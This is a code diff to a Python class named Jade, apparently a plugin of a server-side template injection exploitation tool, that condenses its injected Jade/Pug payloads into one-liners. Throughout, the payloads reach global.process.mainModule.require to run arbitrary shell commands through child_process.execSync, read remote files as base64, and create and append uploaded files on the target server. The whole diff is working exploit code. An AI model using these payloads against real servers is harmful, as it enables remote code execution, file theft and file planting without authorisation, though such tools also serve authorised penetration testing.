@@ -12,10 +12,7 @@ class Jade(Check):
 
     def detect_engine(self):
         
-        execution_code = """- var x = global.process
-- x = x.mainModule.require
-= x('os').platform()
-"""
+        execution_code = """= global.process.mainModule.require('os').platform()"""
         self.set('os', self.inject(execution_code))
         self.set('language', 'javascript')
         self.set('eval', 'javascript')
@@ -30,10 +27,7 @@ class Jade(Check):
 
     def execute(self, command):
 
-        execution_code = """- var x = global.process
-- x = x.mainModule.require
-= x('child_process').execSync("%s")
-""" % quote(command)
+        execution_code = """= global.process.mainModule.require('child_process').execSync("%s")""" % quote(command)
 
         return self.inject(execution_code)
         
@@ -49,12 +43,9 @@ class Jade(Check):
             log.warn('Error getting remote file md5, check presence and permission')
             return
         
-        # Using base64 since self.execute() calling self.inject() strips
+        # Use base64 since self.execute() calling self.inject() strips
         # the response, corrupting the data
-        data_b64encoded = self.inject("""- var x = global.process
-- x = x.mainModule.require
-= x('fs').readFileSync('%s').toString('base64')
-""" % remote_path)
+        data_b64encoded = self.inject("""= global.process.mainModule.require('fs').readFileSync('%s').toString('base64')""" % remote_path)
 
         data = base64decode(data_b64encoded)
         
@@ -85,19 +76,13 @@ class Jade(Check):
                 log.warn('Remote path already exists, use --force-overwrite for overwrite')
                 return
             else:
-                self.inject("""- var x = global.process
-- x = x.mainModule.require
-- x('fs').writeFileSync('%s', '')
-""" % remote_path)
+                self.inject("""- global.process.mainModule.require('fs').writeFileSync('%s', '')""" % remote_path)
         
         # Upload file in chunks of 500 characters
         for chunk in chunkit(data, 500):
 
             chunk_b64 = base64encode(chunk)
-            self.inject("""- var x = global.process
-- x = x.mainModule.require
-- x('fs').appendFileSync('%s', Buffer.from('%s', 'base64'), 'binary')
-""" % (remote_path, chunk_b64))
+            self.inject("""- global.process.mainModule.require('fs').appendFileSync('%s', Buffer.from('%s', 'base64'), 'binary')""" % (remote_path, chunk_b64))
         
         if not md5(data) == self._md5(remote_path):
             log.warn('Remote file md5 mismatch, check manually')
